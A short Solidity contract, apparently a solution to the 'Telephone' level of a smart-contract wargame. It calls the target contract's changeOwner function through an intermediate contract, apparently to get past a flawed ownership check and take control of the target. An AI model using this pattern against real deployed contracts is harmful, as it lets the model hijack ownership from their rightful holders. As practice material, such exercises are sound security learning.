// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./5_Telephone.sol";

contract Call_telephone {
    Telephone telephone;
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner(address owner) public {
        telephone.changeOwner(owner);
    }
}
